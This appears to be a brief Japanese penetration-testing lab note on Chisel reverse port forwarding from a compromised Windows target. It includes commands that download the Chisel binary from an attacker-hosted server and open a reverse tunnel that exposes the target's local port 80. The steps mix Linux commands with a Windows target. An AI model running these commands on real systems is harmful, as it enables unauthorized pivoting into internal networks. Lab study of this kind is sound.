### Chiselクライアントの準備
Attacker Machine (Kali)
- ターゲットのOSに合うchiselのクライアントをGitHubからダウンロード  
  [Chisel GitHubリリースページ](https://github.com/jpillora/chisel/releases/tag/v1.8.1)



### ターゲットマシン(Windows)
1. Chiselクライアントのダウンロード
```bash
wget http://10.10.14.120:8000/chisel
```

2. 解凍
```bash
gzip -d chisel
```

3. 権限の付与
```bash
chmod +x chisel
```

4. Chiselクライアントの実行
```bash
.\chisel.exe client 192.168.45.218:8050 R:8080:127.0.0.1:80
```
- client 
- 192.168.45.218:8050
- R:8080
- 127.0.0.1:80  ターゲットの80番ポート

![](Assets/Images/Pasted%20image%2020260429223014.png)